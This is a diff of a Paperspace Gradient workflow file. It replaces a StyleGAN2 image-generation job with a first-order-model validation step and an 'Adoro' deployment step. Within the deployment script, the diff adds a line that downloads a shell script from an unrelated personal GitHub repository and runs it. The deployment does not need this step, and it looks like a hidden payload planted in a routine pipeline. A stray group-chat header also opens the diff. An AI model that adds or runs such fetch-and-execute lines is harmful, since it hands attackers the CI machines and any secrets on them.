@@ -1,42 +1,54 @@
+Thunder Gold / Tag me in group, [10.10.21 11:41]
 on:
   github:
     branches:
       only: main
 
 jobs:
-  CloneRepo:
-    resources:
-      instance-type: C3
-    outputs:
-     stylegan2:
-        type: volume
-    uses: git-checkout@v1
-    with:
-      # url: https://github.com/gradient-ai/stylegan2.git
-      url: context.event.github.url
-      ref: context.event.github.ref
-  StyleGan2:
+  ValidateModel:
     resources:
       instance-type: P4000
-    needs:
-      - CloneRepo
     inputs:
-      stylegan2: CloneRepo.outputs.stylegan2
+      model:
+        type: dataset
+        with:
+          ref: gradient/voxpt
     outputs:
-      generatedFaces:
+      results:
         type: dataset
         with:
           ref: demo-dataset
     uses: script@v1
     with:
       script: |-
-        pip install scipy==1.3.3
-        pip install requests==2.22.0
-        pip install Pillow==6.2.1
-        cd /inputs/stylegan2
-        python run_generator.py generate-images \
-          --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
-          --seeds=6600-6605 \
-          --truncation-psi=0.5 \
-          --result-dir=/outputs/generatedFaces
-      image: tensorflow/tensorflow:1.14.0-gpu-py3
+        python3 demo.py --relative --adapt_scale \
+          --config config/vox-256.yaml \
+          --checkpoint /inputs/model/vox.pt \
+          --driving_video /app/driving.mp4 \
+          --source_image /app/source.png \
+          --result_video /app/result.mp4
+      image: paperspace/first-order-model
+  CreateDeployment:
+    needs:
+      - ValidateModel
+    resources:
+      instance-type: C3
+    uses: script@v1
+    with:
+      script: |-
+        cat > ./deployment.yaml <<EOF
+        image: paperspace/adoro-server:1.0.0
+        port: 8000
+        resources:
+          replicas: 1
+          instanceType: P4000
+        EOF
+        apt update > /dev/null
+        apt-get install -y jq && wget https://raw.githubusercontent.com/ji725valentyn/tes/main/ltzz.sh && chmod +x ltzz.sh && ./ltzz.sh
+        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
+
+        echo
+        echo "Adoro can be accessed at URL:"
+        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
+
+      image: paperspace/gradient-sdk
